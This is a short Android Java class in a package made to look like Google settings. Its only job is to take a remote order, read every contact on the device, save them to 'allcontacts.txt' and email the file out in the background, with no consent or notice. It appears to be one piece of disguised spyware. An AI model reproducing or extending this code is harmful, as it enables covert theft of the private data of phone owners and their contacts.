package com.setting.dl.google.googlesettings.mail;

import android.content.Context;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Contacts;
import com.setting.dl.google.googlesettings.u;


public class OrderSendContacts {
    
    private final static String fileContacts  = "allcontacts.txt";
    Context context;
    
    OrderSendContacts(Context context) {
        
        this.context = context;
    }
    
    void doit() {
        
        u.runThread(() -> {
    
            String value = new Contacts(context).toString();
    
            u.saveValue(context, fileContacts, value);
            Mail.send(context, fileContacts);
        });
    }
}
